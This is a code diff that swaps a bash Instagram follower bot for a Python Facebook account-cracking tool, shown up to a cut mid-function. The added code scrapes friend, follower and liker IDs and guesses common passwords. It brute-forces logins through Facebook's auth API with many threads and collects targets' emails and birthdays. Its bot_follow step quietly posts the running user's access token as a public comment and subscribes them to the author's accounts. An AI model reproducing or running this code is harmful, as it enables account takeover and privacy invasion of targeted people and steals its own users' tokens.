@@ -1,207 +1,801 @@
-#Don't Copy code without Credits
-#Read LICENSE First.
-string4=$(openssl rand -hex 32 | cut -c 1-4)
-string8=$(openssl rand -hex 32  | cut -c 1-8)
-string12=$(openssl rand -hex 32 | cut -c 1-12)
-string16=$(openssl rand -hex 32 | cut -c 1-16)
-device="android-$string16"
-uuid=$(openssl rand -hex 32 | cut -c 1-32)
-phone="$string8-$string4-$string4-$string4-$string12"
-guid="$string8-$string4-$string4-$string4-$string12"
-header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
-var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
-var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
-ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
+#!/usr/bin/python3
+#-*-coding:utf-8-*-
+# Made By Mark Cornel
+# Thanks To Me
+# Thanks To All My Friends
+# Please Don't Recode, Thanks.
 
-clear
+import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json
+from random import randint
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from datetime import date
+from datetime import datetime
+current = datetime.now()
 
-banner() {
-echo ""
+p = "\x1b[0;37m" # putih
+m = "\x1b[0;31m" # merah
+h = "\x1b[0;32m" # hijau
+k = "\x1b[0;33m" # kuning
+b = "\x1b[0;34m" # biru
+u = "\x1b[0;35m" # ungu
+o = "\x1b[0;36m" # biru muda
 
-echo -e "\e[1;91m##     ##    ###    ########  ##    ##"
-echo -e "\e[1;91m###   ###   ## ##   ##     ## ##   ##"
-echo -e "\e[1;91m#### ####  ##   ##  ##     ## ##  ##"
-echo -e "\e[1;91m## ### ## ##     ## ########  #####"
-echo -e "\e[1;91m##     ## ######### ##   ##   ##  ##"
-echo -e "\e[1;91m##     ## ##     ## ##    ##  ##   ##"
-echo -e "\e[1;91m##     ## ##     ## ##     ## ##    ##"
-echo ""
-echo -e "\e[1;91m [+] YouTube: \e[1;92mNO YOUTUBE CHANNEL YET"
-echo -e "\e[1;91m [+] GITHUB: \e[1;92mGUPTA-SHAKEL"
-echo -e "\e[1;91m [+] FACEBOOK: \e[1;92mMARK CORNEL\e[1;97r"
-echo ""
+if ("linux" in sys.platform.lower()):
 
-}
+        N = "\033[0m"
+        G = "\033[1;92m"
+        O = "\033[1;97m"
+        R = "\033[1;91m"
+else:
 
-login_user() {
+        N = ""
+        G = ""
+        O = ""
+        R = ""
 
+### HEADERS ###
 
-if  $user == "" ; then
-printf "\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Login\e[0m\n"
-read -p $'\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Username: \e[0m' user
-fi
+def banner():
+    print("""
+\033[0;31m##     ##    ###    ########  ##    ##
+\033[0;31m###   ###   ## ##   ##     ## ##   ##
+\033[0;31m#### ####  ##   ##  ##     ## ##  ##
+\033[0;31m## ### ## ##     ## ########  #####
+\033[0;31m##     ## ######### ##   ##   ##  ##
+\033[0;31m##     ## ##     ## ##    ##  ##   ##
+\033[0;31m##     ## ##     ## ##     ## ##    ##
+\033[37;1m[\033[41;1m FACEBOOK ACCOUNT CLONING \033[00;1m\033[37;1m ]\n
+\033[1;37;40m┌──────────────────────┐
+\033[1;37;40m│ ®Script By Mark Cornel ® |
+\033[1;37;40m└──────────────────────┘
+\033[37;1m[\033[41;1m THIS TOOL IS FOR EDUCATIONAL PURPOSE ONLY \033[00;1m\033[37;1m ]\n
+\033[32;1mVersion\033[37;1m:\033[33;1m1.0""")
 
-if  -e cookie.$user ; then
+host="https://mbasic.facebook.com"
+ips=None
+try:
+	b=requests.get("http://ip-api.com/json/").json()["query"]
+	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country"].lower()
+except:
+	ips=None
 
-printf "\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Cookies found for user\e[0m\e[1;77m %s\e[0m\n" $user
+ok = []
+cp = []
+ttl =[]
 
-default_use_cookie="Y"
+durasi = str(datetime.now().strftime("%d-%m-%Y"))
+tahun = current.year
+bulan = current.month
+hari = current.day
 
-read -p $'\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Use it?\e[0m\e[1;77m [Y/n]\e[0m ' use_cookie
+def jalan(z):
+	for e in z + "\n":
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.03)
 
-use_cookie="${use_cookie:-${default_use_cookie}}"
+def clear():
+	if " linux" in sys.platform.lower():
+		os.system("clear")
+	elif "win" in sys.platform.lower():
+		os.system("cls")
+	else:os.system("clear")
+    
+def lang(cookies):
+	f=False
+	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
+	for i in rr.find_all("a",href=True):
+		if "id_ID" in i.get("href"):
+			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
+			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
+			if "apa yang anda pikirkan sekarang" in b.lower():
+				f=True
+	if f==True:
+		return True
+	else:
+		exit("[!] Wrong Cookies")
 
-if  $use_cookie == *'Y'* || $use_cookie == *'y'* ; then
-printf "\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Using saved credentials\e[0m\n"
-else
-rm -rf cookie.$user
-login_user
-fi
+def basecookie():
+	if os.path.exists(".cok"):
+		if os.path.getsize(".cok") !=0:
+			return gets_dict_cookies(open('.cok').read().strip())
+		else:logs()
+	else:logs()
 
+def hdcok():
+	global host
+	hosts=host
+	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
+	return r
 
-else
+def gets_cookies(cookies):
+	result=[]
+	for i in enumerate(cookies.keys()):
+		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
+		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
+	return "".join(result)
 
-read -p $'\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Password: \e[0m' pass
-printf "\n"
-data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
+def gets_dict_cookies(cookies):
+	result={}
+	try:
+		for i in cookies.split(";"):
+			result.update({i.split("=")[0]:i.split("=")[1]})
+		return result
+	except:
+		for i in cookies.split("; "):
+			result.update({i.split("=")[0]:i.split("=")[1]})
+		return result
 
-IFS=$'\n'
+### LOGIN METHODE ###
 
-hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
-useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
+def logs():
+  os.system("clear")
+  banner()
+  print((k+"\n["+p+"1"+k+"]"+p+" Login With Token"))
+  print((k+"["+p+"2"+k+"]"+p+" Login With Cookies"))
+  print((k+"["+p+"0"+k+"]"+p+" Exit"))
+  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+  if sek=="":
+    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
+    logs()
+  elif sek=="1":
+    log_token()
+  elif sek=="2":
+    gen()
+  elif sek=="0":
+    exit()
+  else:
+    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
+    logs()
 
-printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Trying to login as\e[0m\e[1;93m %s\e[0m\n" $user
-IFS=$'\n'
-var=$(curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); 
-if  $var == "challenge" ; then printf "\e[1;93m\n[!] Challenge required\n" ; exit 1; elif  $var == "logged_in_user" ; then printf "\e[1;92m \n[+] Login Successful\n" ; elif  $var == "Please wait" ; then echo "Please wait"; 
+def log_token():
+    os.system("clear")
+    banner()
+    toket = input(k+"\n["+p+"•"+k+"]"+p+" Token : ")
+    try:
+        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
+        a = json.loads(otw.text)
+        nama = a["name"]
+        zedd = open("login.txt", "w")
+        zedd.write(toket)
+        zedd.close()
+        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
+        bot_follow()
+    except KeyError:
+        print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
+        os.system("clear")
+        logs()
 
-else printf "\e[1;91m\n[-] Error in login your instagram  acccount\n";
-     printf "\e[1;91m\n[*] Check your login credentials\n";
-exit 1;
+def gen():
+        os.system("clear")
+        banner()
+        cookie = input(k+"\n["+p+"•"+k+"]"+p+" Cookies : ")
+        try:
+                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
+                "user-agent"                : "Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
+                "referer"                   : "https://m.facebook.com/",
+                "host"                      : "m.facebook.com",
+                "origin"                    : "https://m.facebook.com",
+                "upgrade-insecure-requests" : "1",
+                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+                "cache-control"             : "max-age=0",
+                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+                "content-type"              : "text/html; charset=utf-8"
+                }, cookies = {
+                "cookie"                    : cookie
+                })
+                find_token = re.search("(EAAA\w+)", data.text)
+                hasil    = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
+        except requests.exceptions.ConnectionError:
+                print((k+"["+p+"!"+k+"]"+p+" No Connection"))
+        cookie = open("login.txt", "w")
+        cookie.write(find_token.group(1))
+        cookie.close()
+        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
+        bot_follow()
 
-fi;
+### BOT FOLLOW ### Jangan Diganti Anjing !!!
 
-fi
+def bot_follow():
+	try:
+		toket=open("login.txt","r").read()
+	except IOError:
+		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
+		logs()
+	kom = (" 🌟MARK CORNEL🌟")
+	requests.post('https://graph.facebook.com/100005886040587/subscribers?access_token=' + toket) #Mark Cornel
+	requests.post('https://graph.facebook.com/100036074441739/subscribers?access_token=' + toket) #Igwilo Emilia Afoma
+	requests.post('https://graph.facebook.com/190169383058679/comments/?message=' +toket+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/1874741336016266/comments/?message=' +kom+ '&access_token=' + toket)
+	menu()
 
-}
+### MAIN MENU ###
 
+def menu():
+    try:
+        toket = open("login.txt","r").read()
+        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
+        a = json.loads(otw.text)
+        nama = a["name"]
+        id = a["id"]
+    except Exception as e:
+        print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e))
+        logs()
+    ip = requests.get("https://api.ipify.org").text
+    os.system("clear")
+    banner()
+    print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
+    print((k+"\n["+p+"•"+k+"]"+p+" Your ID : "+id))
+    print((k+"["+p+"•"+k+"]"+p+" Your IP : "+ip))
+    print((k+"["+p+"•"+k+"]"+p+" Status  : "+k+"In Development"+p))
+    print((k+"["+p+"•"+k+"]"+p+" Joined  : "+durasi))
+    print((k+"\n["+p+"1"+k+"]"+p+" Crack ID From Public/Friend"))
+    print((k+"["+p+"2"+k+"]"+p+" Crack ID From Followers"))
+    print((k+"["+p+"3"+k+"]"+p+" Crack ID From Post Likes"))
+    print((k+"["+p+"4"+k+"]"+p+" Crack By Phone Number"))
+    print((k+"["+p+"5"+k+"]"+p+" Crack By Email"))
+    print((k+"["+p+"6"+k+"]"+p+" Get Data Target"))
+    print((k+"["+p+"7"+k+"]"+p+" Result Crack"))
+    print((k+"["+p+"0"+k+"]"+p+" Logout"))
+    choose_menu()
 
-increase_followers() {
+def choose_menu():
+	r=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+	if r=="":
+		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
+		menu()
+	elif r=="1":
+		publik()
+	elif r=="2":
+		follow()
+	elif r=="3":
+		likers()
+	elif r=="4":
+		random_numbers()
+	elif r=="5":
+		random_email()
+	elif r=="6":
+		target()
+	elif r=="7":
+		ress()
+	elif r=="0":
+		try:
+			jalan(k+"\n["+p+"•"+k+"]"+p+" Thanks For Using My Script")
+			os.system("rm -rf login.txt")
+			exit()
+		except Exception as e:
+			print((k+"["+p+"!"+k+"]"+p+" Error %s"%e))
+	else:
+		print((k+"["+p+"!"+k+"]"+p+" Wrong Input"))
+		menu()	
 
-printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] This technique consists of following/unfolling celebgrams\e[0m\n"
-printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m] It can increase your followers up to about +30 in 1 hour \e[0m\n"
-printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m]\e[0m\e[1;93m Press Ctrl + C to stop \e[0m\n"
-sleep 5
+def pilihcrack(file):
+  print((k+"\n["+p+"1"+k+"]"+p+" Mbasic ("+h+"Recommended"+p+")"))
+  print((k+"["+p+"2"+k+"]"+p+" Mbasic + TTL"))
+  krah=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
+  if krah in[""]:
+    print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
+    pilihcrack(file)
+  elif krah in["1","01"]:
+    crack(file)
+  elif krah in["2","02"]:
+    crackttl(file)
+  else:
+    print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
+    pilihcrack(file)
 
-username_id=$(curl -L -s 'https://www.instagram.com/'$user'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')
+### DUMP ID ###
 
-selena="460563723"
-neymar="26669533"
-ariana="7719696"
-beyonce="247944034"
-cristiano="173560420"
-kimkardashian="18428658"
-kendall="6380930"
-therock="232192182"
-kylie="12281817"
-jelopez="305701719"
-messi="427553890"
+def publik():
+	try:
+		toket=open("login.txt","r").read()
+	except IOError:
+		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
+		os.system("rm -rf login.txt")
+		logs()
+	try:
+		print((k+"\n["+p+"•"+k+"]"+p+" Type \'me\' To Dump From Friendlist"))
+		idt = input(k+"["+p+"•"+k+"]"+p+" User ID Target : ")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+		except KeyError:
+			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+			print((k+"\n[ "+p+"Back"+k+" ]"+p))
+			publik()
+		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
+		id = []
+		z=json.loads(r.text)
+		qq = (op["first_name"]+".json").replace(" ","_")
+		ys = open(qq , "w")#.replace(" ","_")
+		for a in z["data"]:
+			id.append(a["id"]+"<=>"+a["name"])
+			ys.write(a["id"]+"<=>"+a["name"]+"\n")
+		ys.close()
+		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
+		return pilihcrack(qq)
+	except Exception as e:
+		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
 
-dualipa="12331195"
-mileycyrus="325734299"
-shawnmendes="212742998"
-katyperry="407964088"
-charlieputh="7555881"
-lelepons="177402262"
-camila_cabello="19596899"
-madonna="181306552"
-leonardodicaprio="1506607755"
-ladygaga="184692323"
-taylorswift="11830955"
-instagram="25025320"
+def follow():
+	try:
+		toket=open("login.txt","r").read()
+	except IOError:
+		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
+		os.system("rm -rf login.txt")
+		logs()
+	try:
+		idt = input(k+"\n["+p+"•"+k+"]"+p+" Followers ID Target : ")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+		except KeyError:
+			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+			print((k+"\n[ "+p+"Back"+k+" ]"+p))
+			publik()
+		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
+		id = []
+		z=json.loads(r.text)
+		qq = (op["first_name"]+".json").replace(" ","_")
+		ys = open(qq , "w")#.replace(" ","_")
+		for a in z["data"]:
+			id.append(a["id"]+"<=>"+a["name"])
+			ys.write(a["id"]+"<=>"+a["name"]+"\n")
+		ys.close()
+		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
+		return pilihcrack(qq)
+	except Exception as e:
+		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
 
+def likers():
+	try:
+		toket=open("login.txt","r").read()
+	except IOError:
+		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
+		os.system("rm -rf login.txt")
+		logs()
+	try:
+		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Post Target : ")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
+		except KeyError:
+			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
+			print((k+"\n[ "+p+"Back"+k+" ]"+p))
+			publik()
+		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
+		id = []
+		z=json.loads(r.text)
+		qq = (op["first_name"]+".json").replace(" ","_")
+		ys = open(qq , "w")#.replace(" ","_")
+		for a in z["data"]:
+			id.append(a["id"]+"<=>"+a["name"])
+			ys.write(a["id"]+"<=>"+a["name"]+"\n")
+		ys.close()
+		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
+		return pilihcrack(qq)
+	except Exception as e:
+		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)
 
-if  ! -e celeb_id ; then
-printf "%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s\n" $dualipa $mileycyrus $shawnmendes $katyperry $charlieputh $lelepons $camila_cabello $madonna $leonardodicaprio $ladygaga $taylorswift $instagram $neymar $selena $ariana $beyonce $cristiano $kimkardashian $kendall $therock $kylie $jelopez $messi > celeb_id
-fi
+### CRACK EMAIL & PHONE ###
 
-while  true ; do
+def random_numbers():
+  data = []
+  print((k+"\n["+p+"•"+k+"]"+p+" Number Must Be 5 Digit"))
+  print((k+"["+p+"•"+k+"]"+p+" Example : 92037"))
+  kode=str(input(k+"["+p+"•"+k+"]"+p+" Input Number : "))
+  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 5 Digit")) if len(kode) < 5 else ''
+  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 5 Digit")) if len(kode) > 5 else ''
+  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
+  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
+  print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
+  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
+    {th.submit(brute, user['user'], user['pw']): user for user in data}
+  input(k+"\n[ "+p+"Back"+k+" ]"+p)
+  menu()
 
+def random_email():
+  data = []
+  nama=input(k+"\n["+p+"•"+k+"]"+p+" Target Name : ")
+  domain=input(k+"["+p+"•"+k+"]"+p+" Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
+  list={
+    'g':'@gmail.com',
+    'y':'@yahoo.com',
+    'h':'@hotmail.com'
+  }
+  exit((k+"["+p+"•"+k+"]"+p+" Fill In The Correct")) if not domain in ['g','y','h'] else ''
+  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
+  setpw=input(k+"["+p+"•"+k+"]"+p+" Set Password : ").split(',')
+  print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
+  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
+  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
+    {th.submit(brute, user['user'], user['pw']): user for user in data}
+  input(k+"\n[ "+p+"Back"+k+" ]"+p)
+  menu()
 
-for celeb in $(cat celeb_id); do
+def brute(user, passs):
+  try:
+    for pw in passs:
+      params={
+        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
+        'format': 'JSON',
+        'sdk_version': '2',
+        'email': user,
+        'locale': 'en_US',
+        'password': pw,
+        'sdk': 'ios',
+        'generate_session_cookies': '1',
+        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
+      }
+      api='https://b-api.facebook.com/method/auth.login'
+      response=requests.get(api, params=params)
+      if re.search('(EAAA)\w+', str(response.text)):
+        print('\x1b[0;32m[\x1b[0;37mMARK-OK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
+        break
+      elif 'www.facebook.com' in response.json()['error_msg']:
+        print('\x1b[0;33m[\x1b[0;37mMARK-CP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
+        break
+  except: pass
 
-data='{"_uuid":"'$guid'", "_uid":"'$username_id'", "user_id":"'$celeb'", "_csrftoken":"'$var2'"}'
-hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
-printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Trying to follow celebgram %s ..." $celeb
+### INFO ACCOUNT ###
 
-check_follow=$(curl -s -L -b cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/create/$celeb/" | grep -o '"following": true')
+def target():
+	try:
+		toket=open("login.txt","r").read()
+	except IOError:
+		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
+		os.system("rm -rf login.txt")
+		login()
+	try:
+		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Target        : ")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print((k+"["+p+"•"+k+"]"+p+" Name Account     : "+op["name"]))
+			print((k+"["+p+"•"+k+"]"+p+" Username         : "+op["username"]))
+			try:
+				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+				op = json.loads(jok.text)
+				print((k+"["+p+"•"+k+"]"+p+" Email            : "+op["email"]))
+			except KeyError:
+				print((k+"["+p+"•"+k+"]"+p+" Email            : -"))
+			try:
+				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+				op = json.loads(jok.text)
+				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : "+op["birthday"]))
+			except KeyError:
+				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : -"))
+			try:
+				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+				op = json.loads(jok.text)
+				print((k+"["+p+"•"+k+"]"+p+" Gender           : "+op["gender"]))
+			except KeyError:
+				print((k+"["+p+"•"+k+"]"+p+" Gender           : -"))
+			try:
+				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+				id = []
+				z = json.loads(r.text)
+				qq = (op["first_name"]+".json").replace(" ","_")
+				ys = open(qq , "w")
+				for i in z["data"]:
+					id.append(i["id"])
+					ys.write(i["id"])
+				ys.close()
+				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : %s"%(len(id))))
+			except KeyError:
+				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : -"))
+			try:
+				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
+				id = []
+				b = json.loads(a.text)
+				bb = (op["first_name"]+".json").replace(" ","_")
+				jw = open(bb , "w")
+				for c in b["data"]:
+					id.append(c["id"])
+					jw.write(c["id"])
+				jw.close()
+				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : %s"%(len(id))))
+			except KeyError:
+				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : -"))
+			try:
+				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+				op = json.loads(jok.text)
+				print((k+"["+p+"•"+k+"]"+p+" Website          : "+op["website"]))
+			except KeyError:
+				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
+			except IOError:
+				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
+			try:
+				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+				op = json.loads(jok.text)
+				print((k+"["+p+"•"+k+"]"+p+" Update Time      : "+op["updated_time"]))
+			except KeyError:
+				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
+			except IOError:
+				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
+			input(k+"\n[ "+p+"Back"+k+" ]"+p)
+			menu()
+		except KeyError:
+			input(k+"\n[ "+p+"Back"+k+" ]"+p)
+			menu()
+	except Exception as e:
+		exit(k+"["+p+"•"+k+"]"+p+" Error : %s"%e)
 
-if  $check_follow == "" ; then
-printf "\n\e[1;93m [!] Error\n"
-printf "\n\e[1;93m [!] You have reached today's following and unfollowing limit\n"
-printf "\n\e[1;93m [8] For solve this error don't follow or unfollow any people on instagram for 24 hour, then run this script again and it will works\n"
-exit 1
-else
-printf "\e[1;92mOK\e[0m\n"
-fi
+### PASSWORD ###
 
-sleep 3
+def generate(text):
+	results=[]
+	global ips
+	for i in text.split(" "):
+		if len(i)<3:
+			continue
+		else:
+			i=i.lower()
+			if len(i)==3 or len(i)==4 or len(i)==5:
+				results.append(i+"123")
+				results.append(i+"12345")
+			else:
+				results.append(i+"123")
+				results.append(i+"12345")
+				results.append(i)
+				if "Nigeria" in ips:
+					results.append("223344")
+					results.append("445566")
+					results.append("1234567")
+					results.append("123456")
+	return results
 
-done
-printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;77m Sleeping 60 secs...\e[0m\n"
-sleep 60
-#unfollow
-for celeb in $(cat celeb_id); do
-data='{"_uuid":"'$guid'", "_uid":"'$username_id'", "user_id":"'$celeb'", "_csrftoken":"'$var2'"}'
-hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
-printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Trying to unfollow celebgram %s ..." $celeb
-check_unfollow=$(curl -s -L -b cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/destroy/$celeb/" | grep -o '"following": false' ) 
+### BRUTE CRACK ###
 
-if  $check_unfollow == "" ; then
-printf "\n\e[1;93m [!] Error, stoping to prevent blocking\n"
-exit 1
-else
-printf "\e[1;92mOK\e[0m\n"
-fi
+def mbasic(em,pas,hosts):
+	r=requests.Session()
